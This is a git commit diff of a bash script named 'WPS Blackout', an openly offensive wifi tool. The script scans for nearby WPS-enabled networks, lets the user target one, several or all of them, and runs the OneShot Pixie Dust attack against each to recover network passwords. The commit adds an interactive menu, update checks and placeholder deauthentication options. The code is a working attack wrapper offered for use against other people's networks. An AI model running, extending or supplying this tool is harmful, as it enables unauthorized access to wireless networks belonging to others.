c9cb0454dfaee442ca46acfbc5fc518e5c531b74
cr4sh <54245632+rkhunt3r@users.noreply.github.com>
2022-08-03 23:12:36 +0200

    Add files via upload

--- blackout.sh
+++ blackout.sh
@@ -2,25 +2,48 @@
 # WPS Blackout by @rkhunt3r
 
 check_root(){
+    banner
     if [[ $EUID -ne 0 ]]; then
     printf "\n\e[0m[\e[91m!\e[0m] Run this script as root! \n"
     exit 1
     fi
 }
 
+check_update(){
+    changed=0
+    git remote update && LC_ALL=C git status -uno | grep -q 'Your branch is behind' && changed=1
+        if [ $changed = 1 ]; then
+            updates=1
+            updates_string="\e[0m\e[92mUpdate avaiable!\e[0m"
+        else
+            updates=0
+            updates_string="\e[0m\e[93mNo updates avaiable\e[0m"
+fi
+}
+
+check_internet(){
+    printf "\n\e[0m[\e[93m*\e[0m] Checking for internet connection... \n"
+    if ! ping -q -c1 google.com &>/dev/null; then
+    printf "\e[0m[\e[91m!\e[0m] Network isn't avaiable! \n" && exit
+    fi
+}
+
 req_check(){
+    banner
     if [ -d $(pwd)/config/OneShot ];then
         printf "\n\e[0m[\e[92mi\e[0m] OneShot folder found! \n"
     else
         printf "\n\e[0m[\e[91m!\e[0m] OneShot folder not found! \n"
         git -C $(pwd)/config clone https://github.com/drygdryg/OneShot #clone oneshot repo
-        banner
+        sleep 2 && blackout_menu
     fi
 }
 
 banner(){
     clear
-    printf "<----- WPS Blackout v1.0 ----->\n"
+    printf "\e[1m\e[38;5;82m"
+    cat config/banner.txt
+    printf "\e[0m"
 }
 
 check_ifaces(){
@@ -55,7 +78,67 @@ check_ifaces(){
 
 }
 
-start_blackout(){
+blackout_menu(){
+    banner
+    printf "| \e[0m\e[96mBlackout UI v1\e[0m | \e[0m\e[95mgithub.com/rkhunt3r/blackout\e[0m | $updates_string |
+
+[ Choose option: ]
+
+[1] WPS Blackout
+[2] Deauth blackout (WAIT)
+[3] All-in-one blackout (WAIT)
+[4] Settings (WAIT)
+[*] Exit
+
+"
+
+read -p "Choice: " menuchoice
+
+case $menuchoice in
+1) wps_blackout;;
+2) deauth_blackout;;
+3) all_blackout;;
+4) settings_menu;;
+*) printf "\n\e[0m[\e[93m*\e[0m] Exiting script..."; exit;;
+esac
+
+}
+
+check_ifaces(){
+    printf "\n\e[0m[\e[93m*\e[0m] Checking interfaces... \n"
+
+    if ip addr 2>/dev/null | grep -q "wlan0"; then
+        printf "\n\e[0m[\e[92mi\e[0m] \e[92mwlan0\e[0m is up!\n"
+        ip link set wlan0 up
+        wlan0_iface=1
+    else
+        printf "\n\e[0m[\e[91m!\e[0m] \e[91mwlan0\e[0m is down\n"
+        wlan0_iface=0
+    fi
+
+    if ip addr 2>/dev/null | grep -q "wlan1"; then
+        printf "\e[0m[\e[92mi\e[0m] \e[92mwlan1\e[0m is up!\n"
+        ip link set wlan1 up
+        wlan1_iface=1
+    else
+        printf "\e[0m[\e[91m!\e[0m] \e[91mwlan1\e[0m is down\n"
+        wlan1_iface=0
+    fi
+
+    sum_ifaces=$(expr $wlan1_iface + $wlan0_iface)
+
+    if [[ "$wlan0_iface" == 0 && "$wlan1_iface" == 0 ]]; then
+        printf "\n\e[0m[\e[91m!\e[0m] No interfaces found!\n"
+        exit
+    else
+        printf "\n\e[0m[\e[92mi\e[0m] We have \e[92m$sum_ifaces\e[0m inteface/s up!\n"
+    fi
+
+}
+
+wps_blackout(){
+
+    check_ifaces
     printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"
 
     printf "\n\e[0m[\e[93m*\e[0m] Scanning for WPS networks (15s)... \n"
@@ -77,38 +160,38 @@ start_blackout(){
 
     printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wps_ssid[@]} WPS networks! \n"
 
+    printf "\n[ Select one, multiple or (a)ll target/s: ]\n\n"
+
+    read -p "Choice: " target_number
+
+    if [ $target_number  == "a" ];
+    then
+        printf "\nSelecting all!\n"
+        target_ssid="${wps_ssid[@]}"
+        target_bssid="${wps_bssid[@]}"
+    else
+        printf "\nSelecting multiple!\n"
+        target_ssid=($(echo $target_number | { while read -d, i; do printf "${wps_ssid[$(($i-1))]}\n"; done; printf "${wps_ssid[$(($i-1))]}\n"; }))
+        target_bssid=($(echo $target_number | { while read -d, i; do printf "${wps_bssid[$(($i-1))]}\n"; done; printf "${wps_bssid[$(($i-1))]}\n"; }))
+    fi
+
     printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi network...\n"
 
     LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
     do nmcli con down uuid $line &>/dev/null;    
     done
 
-    printf "\n\e[0m[\e[93m*\e[0m] Attacking all networks using OneShot... \n"
+    printf "\n\e[0m[\e[93m*\e[0m] Attacking network/s using OneShot... \n"
 
     y=0
-    while [ $y -lt ${#wps_ssid[@]} ]
+    while [ $y -lt ${#target_ssid[@]} ]
     do  
-        printf "\n\e[0m[\e[93m*\e[0m] ($((y+1))/${#wps_ssid[@]}) Attacking ${wps_ssid[$y]}\n\n"
-        # oneshot=$(python3 $(pwd)/config/OneShot/oneshot.py -i wlan0 -b ${wps_ssid[$y]} -K -w)
-        python3 $(pwd)/config/OneShot/oneshot.py -i wlan0 -b ${wps_ssid[$y]} -K -w
-        # cmd=$(bash cd.sh)
-        # match="WPA PSK:"
-        # if [[ $oneshot =~ $match ]]; then
-        #     printf "\n\e[0m[\e[92mi\e[0m] Found ${wps_ssid[$y]} WPS PSK! \n"
-        # else
-        #     printf "\n\e[0m[\e[91m!\e[0m] Found ${wps_ssid[$y]} WPS PSK not found! \n"
-        # fi
-
+        printf "\n\e[0m[\e[93m*\e[0m] ($((y+1))/${#target_ssid[@]}) Attacking ${target_bssid[$y]} (${target_ssid[$y]})\n\n"
+        
+        python3 $(pwd)/config/OneShot/oneshot.py -i wlan0 -b ${target_ssid[$y]} -K -w
+        
         printf "\n\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
         read ener_empty_value
-
-        # if [ $oneshot | grep -q "[*] Scanning…" ]; then
-        #     echo "\e[92mSCANNING\e[0m"
-        # else
-        #     echo "TEST NOT Scanning"
-        # fi
-
-
         y=$((y+1))
     done 
 
@@ -122,7 +205,7 @@ start_blackout(){
 }
 
 check_root
-banner
+check_internet
+check_update
 req_check
-check_ifaces
-start_blackout
+blackout_menu
